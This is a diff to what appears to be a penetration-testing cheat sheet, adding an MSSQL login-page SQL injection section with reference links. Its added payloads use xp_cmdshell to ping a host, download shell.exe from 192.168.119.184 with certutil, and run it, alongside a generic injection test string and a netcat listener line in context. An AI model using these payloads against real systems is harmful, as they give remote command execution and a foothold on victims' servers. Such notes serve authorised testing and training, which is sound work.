@@ -440,11 +440,29 @@ nc -nlvp 22
 ````
 
 ### SQL Injection
-#### SQL and php login page
-##### Testing sqli in every input field
+#### Reference page
+````
+https://github.com/swisskyrepo/PayloadsAllTheThings
+````
+#### Testing sqli in every input field
 ````
 ';#---
 ````
+#### MSSQL login page injection
+##### Reference page
+````
+https://www.tarlogic.com/blog/red-team-tales-0x01/
+````
+````
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution
+````
+##### Exploitation
+````
+';EXEC master.dbo.xp_cmdshell 'ping 192.168.119.184';--
+';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.119.184:443/shell.exe C:\\Windows\temp\shell.exe';--
+';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe';--
+````
+#### SQL and php login page
 ##### vulnerable code
 
 ````
